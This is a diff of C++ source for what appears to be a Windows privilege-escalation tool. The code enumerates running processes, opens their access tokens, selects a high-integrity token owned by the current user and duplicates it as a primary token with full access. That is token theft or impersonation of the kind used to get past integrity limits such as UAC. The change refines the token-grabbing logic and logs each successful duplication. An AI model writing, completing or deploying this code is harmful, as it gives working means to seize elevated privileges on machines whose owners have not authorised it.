@@ -176,14 +176,11 @@ int main() {
     if (Process32First(hSnap, &pe)) {
         do {
             HANDLE hProc = OpenProcess(
-                PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
+                PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
             if (!hProc) continue;
 
             HANDLE hTok = nullptr;
-            if (!OpenProcessToken(hProc, TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok)) {
-                // Try with fewer rights
-                OpenProcessToken(hProc, TOKEN_QUERY, &hTok);
-            }
+            OpenProcessToken(hProc, TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok);
 
             if (hTok) {
                 DWORD level = GetTokenIntegrity(hTok);
@@ -198,21 +195,18 @@ int main() {
 
                 // Pick the best: High integrity, owned by us, duplicatable
                 if (level >= 0x3000 && level < 0x4000 && isUser && !hBestToken) {
-                    // Re-open with full rights for duplication
-                    HANDLE hProcFull = OpenProcess(
-                        PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
-                    if (hProcFull) {
-                        HANDLE hTokFull = nullptr;
-                        if (OpenProcessToken(hProcFull,
-                            TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTokFull)) {
-                            hBestToken = hTokFull;
-                            bestPid    = pe.th32ProcessID;
-                            bestLevel  = level;
-                            strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
-                            OK("Selected: %s (PID %lu) at %s",
-                               bestName, bestPid, IntegrityName(bestLevel));
-                        }
-                        CloseHandle(hProcFull);
+                    // Try to duplicate directly from the token we already have
+                    HANDLE hDup = nullptr;
+                    if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
+                            SecurityImpersonation, TokenPrimary, &hDup)) {
+                        hBestToken = hDup;
+                        bestPid    = pe.th32ProcessID;
+                        bestLevel  = level;
+                        strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
+                        OK("Selected + duplicated: %s (PID %lu) at %s",
+                           bestName, bestPid, IntegrityName(bestLevel));
+                    } else {
+                        DBG("DuplicateTokenEx failed for %s — trying next", pe.szExeFile);
                     }
                 }
                 CloseHandle(hTok);
